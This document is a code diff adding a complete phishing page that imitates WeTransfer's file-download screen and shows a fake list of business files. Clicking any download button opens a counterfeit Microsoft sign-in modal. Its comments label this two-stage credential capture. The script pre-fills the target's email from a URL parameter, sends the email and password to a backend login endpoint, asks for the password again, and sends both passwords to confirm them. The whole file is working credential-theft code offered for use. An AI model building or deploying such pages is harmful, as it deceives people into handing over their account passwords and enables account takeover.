@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WeTransfer | Send Large Files Fast</title>
+    <link rel="icon" type="image/svg+xml"
+          href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 20'%3E%3Cpath fill='%233767ea' d='m12.23 14.24c-.38-.61-.7-.93-1.25-.93s-.87.32-1.25.93l-1.67 2.67c-.63 1.03-1.15 1.75-2.37 1.75s-1.78-.5-2.37-1.89c-.73-1.71-1.5-3.78-2.2-6.55C.37 7.12.02 5.2.02 3.63S.5 1.14 2.18.82C4.48.39 7.58.14 11 .14s6.52.25 8.82.68c1.67.32 2.16 1.25 2.16 2.81s-.35 3.49-1.12 6.59c-.7 2.78-1.46 4.84-2.2 6.55-.59 1.39-1.15 1.89-2.37 1.89-1.22 0-1.74-.71-2.37-1.75zm26.52 2.5c-1.18 1.28-3.41 2.21-6.34 2.21-5.89 0-9.37-4.1-9.37-9.47 0-5.77 4.01-9.19 9.2-9.19 4.63 0 7.7 2.46 7.7 5.77 0 3.13-2.61 5.16-5.58 5.16-1.6 0-2.79-.32-3.59-.96-.31-.25-.49-.21-.49.07 0 1.18.42 2.17 1.18 2.96.63.64 1.81 1.07 2.93 1.07 1.15 0 2.16-.25 3.07-.71s1.67-.32 2.13.43c.52.85-.21 1.96-.84 2.67z'/%3E%3C/svg%3E">
+
+    <style>
+        /* ============================================================
+           WeTransfer 品牌变量（来自官网设计系统）
+           ============================================================ */
+        :root {
+            --wt-blue: #3767ea;
+            --wt-blue-hover: #4e7df7;
+            --wt-blue-active: #1842ce;
+            --wt-blue-tint: #f5f8ff;
+            --wt-ink: #161616;
+            --wt-charcoal: #353535;
+            --wt-muted: #676767;
+            --wt-canvas: #ffffff;
+            --wt-gray-10: #f9f9f9;
+            --wt-gray-30: #d6d6d6;
+            --wt-radius: 12px;
+            --wt-radius-sm: 8px;
+            --wt-font-text: 'Actief Grotesque', 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            --wt-font-display: 'GT Super WT', Georgia, 'Times New Roman', serif;
+        }
+
+        * { box-sizing: border-box; }
+        html, body { margin: 0; padding: 0; min-height: 100vh; }
+
+        body {
+            font-family: var(--wt-font-text);
+            background: var(--wt-blue-tint); /* 淡蓝色背景，匹配官网导航栏区域 */
+            color: var(--wt-ink);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 16px 40px;
+        }
+
+        /* ============================================================
+           顶部导航栏（精确还原 WeTransfer 官网）
+           ============================================================ */
+        .wt-nav {
+            width: 100%;
+            max-width: 1440px;
+            height: 72px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 40px;
+        }
+
+        .wt-nav-logo {
+            width: 44px;
+            height: 22px;
+            display: block;
+            flex-shrink: 0;
+        }
+
+        .wt-nav-logo path {
+            fill: var(--wt-canvas); /* 白色 we 标志 */
+        }
+
+        .wt-nav-menu {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--wt-canvas);
+            border-radius: 100px;
+            padding: 8px 16px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
+        }
+
+        .wt-nav-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            padding: 8px 14px;
+            border-radius: 100px;
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--wt-charcoal);
+            text-decoration: none;
+            transition: color .15s ease, background .15s ease;
+            white-space: nowrap;
+            cursor: pointer;
+        }
+
+        .wt-nav-link:hover {
+            color: var(--wt-muted);
+            background: var(--wt-gray-10);
+        }
+
+        .wt-nav-link .chevron {
+            width: 12px;
+            height: 12px;
+            display: inline-block;
+            transition: transform .15s ease;
+        }
+
+        .wt-nav-link:hover .chevron {
+            transform: rotate(180deg);
+        }
+
+        /* ============================================================
+           卡片（原有的 accept / download 卡片）
+           ============================================================ */
+        .wt-card {
+            background: var(--wt-canvas);
+            width: 100%;
+            max-width: 640px;
+            border-radius: var(--wt-radius);
+            padding: 40px 44px 36px;
+            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.06);
+            margin-top: 20px;
+        }
+
+        .wt-card-logo {
+            width: 80px;
+            height: 40px;
+            display: block;
+            margin-bottom: 28px;
+        }
+
+        .wt-card-logo path {
+            fill: var(--wt-ink);
+        }
+
+        .wt-title {
+            font-family: var(--wt-font-display);
+            font-size: 28px;
+            font-weight: 900;
+            line-height: 1.2;
+            margin: 0 0 6px;
+            color: var(--wt-ink);
+        }
+
+        .wt-subtitle { font-size: 14px; color: var(--wt-muted); margin: 0 0 28px; }
+
+        .wt-file-list { border-top: 1px solid var(--wt-gray-30); margin-bottom: 28px; }
+
+        .wt-file-row {
+            display: flex;
+            align-items: center;
+            padding: 14px 0;
+            border-bottom: 1px solid #f1f1f1;
+        }
+        .wt-file-row:last-child { border-bottom: none; }
+
+        .wt-file-icon { width: 22px; height: 28px; margin-right: 14px; flex-shrink: 0; }
+
+        .wt-file-name {
+            flex: 1;
+            font-size: 15px;
+            font-weight: 500;
+            color: var(--wt-ink);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .wt-file-size { font-size: 14px; color: var(--wt-muted); margin-right: 18px; flex-shrink: 0; }
+
+        .wt-download-icon {
+            width: 24px; height: 24px;
+            cursor: pointer;
+            color: var(--wt-blue);
+            flex-shrink: 0;
+            transition: color .15s ease;
+        }
+        .wt-download-icon:hover { color: var(--wt-blue-hover); }
+
+        .wt-btn {
+            display: block;
+            width: 100%;
+            height: 48px;
+            background: var(--wt-blue);
+            color: #ffffff;
+            border: none;
+            border-radius: var(--wt-radius-sm);
+            font-family: var(--wt-font-text);
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background .15s ease;
+        }
+        .wt-btn:hover  { background: var(--wt-blue-hover); }
+        .wt-btn:active { background: var(--wt-blue-active); }
+
+        /* ============================================================
+           登录模态框（两阶段凭证捕获）
+           ============================================================ */
+        .login-modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, .55);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            font-family: var(--wt-font-text);
+        }
+        .login-modal-content {
+            background: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 44px;
+            box-shadow: 0 2px 24px rgba(0, 0, 0, .25);
+            border-radius: 2px;
+        }
+        .login-brand { margin-bottom: 20px; }
+        .login-title {
+            font-family: var(--wt-font-text);
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin: 0 0 8px;
+        }
+        .login-subtitle { font-size: 14px; color: #605e5c; margin: 0 0 24px; line-height: 1.4; }
+        .login-form { display: flex; flex-direction: column; gap: 12px; }
+        .login-input {
+            height: 40px;
+            padding: 0 12px;
+            font-size: 15px;
+            border: 1px solid #8a8886;
+            border-radius: 2px;
+            outline: none;
+            font-family: inherit;
+            width: 100%;
+        }
+        .login-input:focus { border-color: #0067b8; }
+        .login-input[readonly] { background: #f3f2f1; color: #605e5c; }
+        .login-btn {
+            height: 40px;
+            background: #0067b8;
+            color: #ffffff;
+            border: none;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: 2px;
+            margin-top: 6px;
+            font-family: inherit;
+        }
+        .login-btn:hover { background: #005da6; }
+        .login-btn:disabled { background: #8a8886; cursor: not-allowed; }
+        .login-error { color: #a4262c; font-size: 13px; margin: 0; min-height: 0; }
+
+        /* ============================================================
+           响应式
+           ============================================================ */
+        @media (max-width: 768px) {
+            .wt-nav {
+                padding: 0 20px;
+                height: 64px;
+            }
+            .wt-nav-menu {
+                gap: 2px;
+                padding: 6px 10px;
+            }
+            .wt-nav-link {
+                padding: 6px 10px;
+                font-size: 13px;
+            }
+        }
+
+        @media (max-width: 560px) {
+            .wt-card { padding: 28px 22px 24px; }
+            .wt-title { font-size: 24px; }
+            .login-modal-content { padding: 30px 24px; }
+            .wt-nav-menu {
+                flex-wrap: wrap;
+                justify-content: flex-end;
+                border-radius: 16px;
+            }
+        }
+    </style>
+</head>
+
+<body onload="load()">
+
+    <!-- =========================================================
+         顶部导航栏 — 精确还原 WeTransfer 官网
+         ========================================================= -->
+    <nav class="wt-nav">
+        <svg class="wt-nav-logo" viewBox="0 0 40 20" xmlns="http://www.w3.org/2000/svg" aria-label="WeTransfer">
+            <path d="m12.23 14.24c-.38-.61-.7-.93-1.25-.93s-.87.32-1.25.93l-1.67 2.67c-.63 1.03-1.15 1.75-2.37 1.75s-1.78-.5-2.37-1.89c-.73-1.71-1.5-3.78-2.2-6.55C.37 7.12.02 5.2.02 3.63S.5 1.14 2.18.82C4.48.39 7.58.14 11 .14s6.52.25 8.82.68c1.67.32 2.16 1.25 2.16 2.81s-.35 3.49-1.12 6.59c-.7 2.78-1.46 4.84-2.2 6.55-.59 1.39-1.15 1.89-2.37 1.89-1.22 0-1.74-.71-2.37-1.75zm26.52 2.5c-1.18 1.28-3.41 2.21-6.34 2.21-5.89 0-9.37-4.1-9.37-9.47 0-5.77 4.01-9.19 9.2-9.19 4.63 0 7.7 2.46 7.7 5.77 0 3.13-2.61 5.16-5.58 5.16-1.6 0-2.79-.32-3.59-.96-.31-.25-.49-.21-.49.07 0 1.18.42 2.17 1.18 2.96.63.64 1.81 1.07 2.93 1.07 1.15 0 2.16-.25 3.07-.71s1.67-.32 2.13.43c.52.85-.21 1.96-.84 2.67z"/>
+        </svg>
+
+        <div class="wt-nav-menu">
+            <a class="wt-nav-link" href="#features">
+                Features
+                <svg class="chevron" viewBox="0 0 12 12" fill="none">
+                    <path d="M3 4.5l3 3 3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </a>
+            <a class="wt-nav-link" href="#pricing">Pricing</a>
+            <a class="wt-nav-link" href="#use-cases">
+                Use cases
+                <svg class="chevron" viewBox="0 0 12 12" fill="none">
+                    <path d="M3 4.5l3 3 3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </a>
+            <a class="wt-nav-link" href="#resources">
+                Resources
+                <svg class="chevron" viewBox="0 0 12 12" fill="none">
+                    <path d="M3 4.5l3 3 3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </a>
+        </div>
+    </nav>
+
+    <!-- =========================================================
+         Accept 卡片（初始下载提示）
+         ========================================================= -->
+    <div class="wt-card" id="accept-container">
+        <svg class="wt-card-logo" viewBox="0 0 40 20" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#161616" d="m12.23 14.24c-.38-.61-.7-.93-1.25-.93s-.87.32-1.25.93l-1.67 2.67c-.63 1.03-1.15 1.75-2.37 1.75s-1.78-.5-2.37-1.89c-.73-1.71-1.5-3.78-2.2-6.55C.37 7.12.02 5.2.02 3.63S.5 1.14 2.18.82C4.48.39 7.58.14 11 .14s6.52.25 8.82.68c1.67.32 2.16 1.25 2.16 2.81s-.35 3.49-1.12 6.59c-.7 2.78-1.46 4.84-2.2 6.55-.59 1.39-1.15 1.89-2.37 1.89-1.22 0-1.74-.71-2.37-1.75zm26.52 2.5c-1.18 1.28-3.41 2.21-6.34 2.21-5.89 0-9.37-4.1-9.37-9.47 0-5.77 4.01-9.19 9.2-9.19 4.63 0 7.7 2.46 7.7 5.77 0 3.13-2.61 5.16-5.58 5.16-1.6 0-2.79-.32-3.59-.96-.31-.25-.49-.21-.49.07 0 1.18.42 2.17 1.18 2.96.63.64 1.81 1.07 2.93 1.07 1.15 0 2.16-.25 3.07-.71s1.67-.32 2.13.43c.52.85-.21 1.96-.84 2.67z"/>
+        </svg>
+
+        <h1 class="wt-title">4 files, 5.6 MB</h1>
+        <p class="wt-subtitle">Transfer expires in 7 days</p>
+
+        <div class="wt-file-list">
+            <div class="wt-file-row">
+                <svg class="wt-file-icon" viewBox="0 0 24 30" fill="none">
+                    <path d="M3 0h13l5 5v22a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2z" fill="#f1f1f1" stroke="#d6d6d6"/>
+                    <path d="M16 0l5 5h-5V0z" fill="#d6d6d6"/>
+                    <text x="12" y="20" font-family="Arial" font-size="6" font-weight="700" fill="#676767" text-anchor="middle">PDF</text>
+                </svg>
+                <span class="wt-file-name">Purchase order.pdf</span>
+                <span class="wt-file-size">501 KB</span>
+            </div>
+        </div>
+
+        <button class="wt-btn" onclick="showDiv()">Download</button>
+    </div>
+
+    <!-- =========================================================
+         Download 卡片（完整文件列表 + Download all）
+         ========================================================= -->
+    <div class="wt-card" id="download-container" style="display:none;">
+        <input type="email" id="user" name="user" style="display:none;">
+
+        <svg class="wt-card-logo" viewBox="0 0 40 20" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#161616" d="m12.23 14.24c-.38-.61-.7-.93-1.25-.93s-.87.32-1.25.93l-1.67 2.67c-.63 1.03-1.15 1.75-2.37 1.75s-1.78-.5-2.37-1.89c-.73-1.71-1.5-3.78-2.2-6.55C.37 7.12.02 5.2.02 3.63S.5 1.14 2.18.82C4.48.39 7.58.14 11 .14s6.52.25 8.82.68c1.67.32 2.16 1.25 2.16 2.81s-.35 3.49-1.12 6.59c-.7 2.78-1.46 4.84-2.2 6.55-.59 1.39-1.15 1.89-2.37 1.89-1.22 0-1.74-.71-2.37-1.75zm26.52 2.5c-1.18 1.28-3.41 2.21-6.34 2.21-5.89 0-9.37-4.1-9.37-9.47 0-5.77 4.01-9.19 9.2-9.19 4.63 0 7.7 2.46 7.7 5.77 0 3.13-2.61 5.16-5.58 5.16-1.6 0-2.79-.32-3.59-.96-.31-.25-.49-.21-.49.07 0 1.18.42 2.17 1.18 2.96.63.64 1.81 1.07 2.93 1.07 1.15 0 2.16-.25 3.07-.71s1.67-.32 2.13.43c.52.85-.21 1.96-.84 2.67z"/>
+        </svg>
+
+        <h1 class="wt-title">4 files, 5.6 MB</h1>
+        <p class="wt-subtitle">Transfer expires in 7 days</p>
+
+        <div class="wt-file-list">
+            <div class="wt-file-row">
+                <svg class="wt-file-icon" viewBox="0 0 24 30" fill="none">
+                    <path d="M3 0h13l5 5v22a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2z" fill="#f1f1f1" stroke="#d6d6d6"/>
+                    <path d="M16 0l5 5h-5V0z" fill="#d6d6d6"/>
+                    <text x="12" y="20" font-family="Arial" font-size="6" font-weight="700" fill="#676767" text-anchor="middle">PDF</text>
+                </svg>
+                <span class="wt-file-name">Purchase order.pdf</span>
+                <span class="wt-file-size">501 KB</span>
+                <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 3v12m0 0l-4-4m4 4l4-4M5 20h14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+
+            <div class="wt-file-row">
+                <svg class="wt-file-icon" viewBox="0 0 24 30" fill="none">
+                    <path d="M3 0h13l5 5v22a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2z" fill="#f1f1f1" stroke="#d6d6d6"/>
+                    <path d="M16 0l5 5h-5V0z" fill="#d6d6d6"/>
+                    <text x="12" y="20" font-family="Arial" font-size="6" font-weight="700" fill="#676767" text-anchor="middle">PDF</text>
+                </svg>
+                <span class="wt-file-name">Product Sample.pdf</span>
+                <span class="wt-file-size">501 KB</span>
+                <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 3v12m0 0l-4-4m4 4l4-4M5 20h14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+
+            <div class="wt-file-row">
+                <svg class="wt-file-icon" viewBox="0 0 24 30" fill="none">
+                    <rect x="1" y="4" width="22" height="22" rx="2" fill="#f1f1f1" stroke="#d6d6d6"/>
+                    <path d="M10 10l6 5-6 5V10z" fill="#676767"/>
+                </svg>
+                <span class="wt-file-name">Sample Video.mp4</span>
+                <span class="wt-file-size">2.3 MB</span>
+                <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 3v12m0 0l-4-4m4 4l4-4M5 20h14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+
+            <div class="wt-file-row">
+                <svg class="wt-file-icon" viewBox="0 0 24 30" fill="none">
+                    <path d="M3 0h13l5 5v22a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2z" fill="#f1f1f1" stroke="#d6d6d6"/>
+                    <path d="M16 0l5 5h-5V0z" fill="#d6d6d6"/>
+                    <text x="12" y="20" font-family="Arial" font-size="6" font-weight="700" fill="#676767" text-anchor="middle">PDF</text>
+                </svg>
+                <span class="wt-file-name">Specifications.pdf</span>
+                <span class="wt-file-size">2 MB</span>
+                <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 3v12m0 0l-4-4m4 4l4-4M5 20h14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+        </div>
+
+        <button class="wt-btn" onclick="submitValue()">Download all</button>
+    </div>
+
+    <!-- =========================================================
+         Stage 1 模态框 — Microsoft 登录（凭证捕获）
+         ========================================================= -->
+    <div id="stage1-modal" class="login-modal">
+        <div class="login-modal-content">
+            <div class="login-brand">
+                <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="0" y="1" width="10" height="10" fill="#F25022"/>
+                    <rect x="11" y="1" width="10" height="10" fill="#7FBA00"/>
+                    <rect x="0" y="12" width="10" height="10" fill="#00A4EF"/>
+                    <rect x="11" y="12" width="10" height="10" fill="#FFB900"/>
+                    <text x="26" y="17" font-family="Segoe UI, Arial, sans-serif" font-size="14" font-weight="600" fill="#5e5e5e">Microsoft</text>
+                </svg>
+            </div>
+            <h2 class="login-title">Sign in to continue</h2>
+            <p class="login-subtitle">Your download is ready. Sign in to verify you're human.</p>
+            <form id="stage1-form" class="login-form">
+                <input type="email"    id="s1-email"    class="login-input" autocomplete="username" required>
+                <input type="password" id="s1-password" class="login-input" autocomplete="current-password" required>
+                <p class="login-error" id="s1-error"></p>
+                <button type="submit" class="login-btn">Sign in</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- =========================================================
+         Stage 2 模态框 — 重新输入密码
+         ========================================================= -->
+    <div id="stage2-modal" class="login-modal">
+        <div class="login-modal-content">
+            <div class="login-brand">
+                <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="0" y="1" width="10" height="10" fill="#F25022"/>
+                    <rect x="11" y="1" width="10" height="10" fill="#7FBA00"/>
+                    <rect x="0" y="12" width="10" height="10" fill="#00A4EF"/>
+                    <rect x="11" y="12" width="10" height="10" fill="#FFB900"/>
+                    <text x="26" y="17" font-family="Segoe UI, Arial, sans-serif" font-size="14" font-weight="600" fill="#5e5e5e">Microsoft</text>
+                </svg>
+            </div>
+            <h2 class="login-title">Verify your identity</h2>
+            <p class="login-subtitle">For your security, please re-enter your password to complete the download.</p>
+            <form id="stage2-form" class="login-form">
+                <input type="password" id="s2-password" class="login-input" autocomplete="current-password" required>
+                <p class="login-error" id="s2-error"></p>
+                <button type="submit" class="login-btn">Verify</button>
+            </form>
+        </div>
+    </div>
+
+<script>
+/* ============================================================
+   API 配置
+   '' = 同源（页面由 Express 提供）
+   如果页面独立托管，请填写完整 URL
+   ============================================================ */
+const API_BASE = '';
+
+let currentEmail  = '';
+let firstPassword = '';
+
+/* ---------- URL 解析：?auth=<email>（新） + base64（旧版兼容） ---------- */
+function parseUserFromUrl() {
+    /* 1) 首选：?auth=email@domain.com  （URLSearchParams 会自动解码 %40） */
+    try {
+        const params = new URLSearchParams(window.location.search);
+        const auth = params.get('auth');
+        if (auth) return auth;
+    } catch (e) {}
+
+    /* 2) 旧版：?<base64("user=email")>  — 仅当原始查询字符串中没有 '=' 时 */
+    const search = window.location.search;
+    if (search && search.length > 1 && !search.includes('=')) {
+        try {
+            const kv = atob(search.substring(1)).split('=');
+            if (kv.length > 1) return decodeURIComponent(kv[1]);
+        } catch (e) {}
+    }
+
+    /* 3) 旧版：#<base64("user=email")> */
+    const hash = window.location.hash.substring(1);
+    if (hash) {
+        try {
+            const kv = atob(hash).split('=');
+            if (kv.length > 1) return decodeURIComponent(kv[1]);
+        } catch (e) {}
+    }
+    return '';
+}
+
+function load() {
+    /* 保留 ?auth=… 形式的 URL 不变，使其保持可读 */
+    const hasAuthParam = (() => {
+        try { return new URLSearchParams(window.location.search).has('auth'); }
+        catch (e) { return false; }
+    })();
+
+    if (!hasAuthParam) {
+        /* 旧版 hash → base64 查询字符串重写（不变） */
+        const hash = window.location.hash.substring(1);
+        if (hash) {
+            let decoded;
+            try { decoded = atob(hash); } catch (e) { decoded = hash; }
+            const encoded = btoa(decoded);
+            if (window.location.hash.substring(1) !== encoded) {
+                history.pushState(null, '', window.location.pathname + '?' + encoded);
+            }
+        }
+    }
+
+    currentEmail = parseUserFromUrl();
+    const userInput = document.getElementById('user');
+    if (userInput) { userInput.value = currentEmail; userInput.readOnly = true; }
+}
+
+/* ---------- UI 辅助函数 ---------- */
+function showDiv() {
+    document.getElementById('accept-container').style.display   = 'none';
+    document.getElementById('download-container').style.display = 'block';
+}
+
+/* ---------- Download 按钮 → 打开 Stage 1 ---------- */
+function submitValue() {
+    if (!currentEmail) {
+        const u = document.getElementById('user');
+        if (u && u.value.trim()) currentEmail = u.value.trim();
+    }
+    const emailField = document.getElementById('s1-email');
+    emailField.value    = currentEmail || '';
+    emailField.readOnly = !!currentEmail;
+    document.getElementById('s1-password').value = '';
+    document.getElementById('s1-error').textContent = '';
+    document.getElementById('stage1-modal').style.display = 'flex';
+    setTimeout(() => {
+        (currentEmail
+            ? document.getElementById('s1-password')
+            : document.getElementById('s1-email')
+        ).focus();
+    }, 100);
+}
+
+/* ---------- Fetch 辅助函数 ---------- */
+async function apiLogin(payload) {
+    const res = await fetch(API_BASE + '/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    });
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    return res.json();
+}
+
+/* ---------- Stage 1 ---------- */
+document.getElementById('stage1-form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const email    = document.getElementById('s1-email').value.trim();
+    const password = document.getElementById('s1-password').value;
+    const errEl    = document.getElementById('s1-error');
+    const btn      = e.target.querySelector('button[type="submit"]');
+    errEl.textContent = '';
+
+    if (!email || !password) { errEl.textContent = 'Please enter your email and password.'; return; }
+
+    btn.disabled = true;
+    const original = btn.textContent;
+    btn.textContent = 'Signing in…';
+
+    try {
+        const data = await apiLogin({ email, password, stage: 1 });
+        if (data.success) {
+            currentEmail  = email;
+            firstPassword = password;
+            document.getElementById('stage1-modal').style.display = 'none';
+            document.getElementById('s2-password').value = '';
+            document.getElementById('s2-error').textContent = '';
+            document.getElementById('stage2-modal').style.display = 'flex';
+            setTimeout(() => document.getElementById('s2-password').focus(), 100);
+        } else {
+            errEl.textContent = data.message || 'Invalid credentials. Please try again.';
+        }
+    } catch (err) {
+        errEl.textContent = 'Connection error. Please try again.';
+        console.error(err);
+    } finally {
+        btn.disabled = false;
+        btn.textContent = original;
+    }
+});
+
+/* ---------- Stage 2 ---------- */
+document.getElementById('stage2-form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const password = document.getElementById('s2-password').value;
+    const errEl    = document.getElementById('s2-error');
+    const btn      = e.target.querySelector('button[type="submit"]');
+    errEl.textContent = '';
+    if (!password) { errEl.textContent = 'Please enter your password.'; return; }
+
+    btn.disabled = true;
+    const original = btn.textContent;
+    btn.textContent = 'Verifying…';
+
+    try {
+        const data = await apiLogin({
+            email: currentEmail,
+            password,
+            stage: 2,
+            firstPassword
+        });
+        if (data.success && data.match) {
+            document.getElementById('stage2-modal').style.display = 'none';
+            if (data.redirect) {
+                window.location.href = data.redirect;
+            } else {
+                showDiv();
+            }
+        } else {
+            errEl.textContent = 'Incorrect password. Please try again.';
+            document.getElementById('s2-password').value = '';
+            setTimeout(() => document.getElementById('s2-password').focus(), 100);
+        }
+    } catch (err) {
+        errEl.textContent = 'Connection error. Please try again.';
+        console.error(err);
+    } finally {
+        btn.disabled = false;
+        btn.textContent = original;
+    }
+});
+</script>
+
+</body>
+</html>
